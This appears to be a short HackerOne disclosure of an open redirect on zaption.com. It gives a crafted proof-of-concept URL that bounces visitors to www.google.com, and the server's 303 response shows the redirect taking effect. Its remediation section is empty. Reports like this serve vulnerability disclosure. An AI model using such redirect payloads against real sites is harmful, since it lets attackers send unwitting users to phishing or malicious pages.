# HackerOne Report: [zaption.com] Open Redirect
**Report ID:** 45516
**Vulnerability Class:** Open Redirect

## Vulnerability Information & PoC
PoC:
http://zaption.com///www.google.com/%2f%2e%2e

HTTP Response:
> HTTP/1.1 303 See Other
> Access-Control-Allow-Origin: *
> Content-Type: text/html; charset=utf-8
> Date: Wed, 28 Jan 2015 11:10:52 GMT
> Location: //www.google.com/%2f%2e%2e/

## Discussion & Remediation Timeline
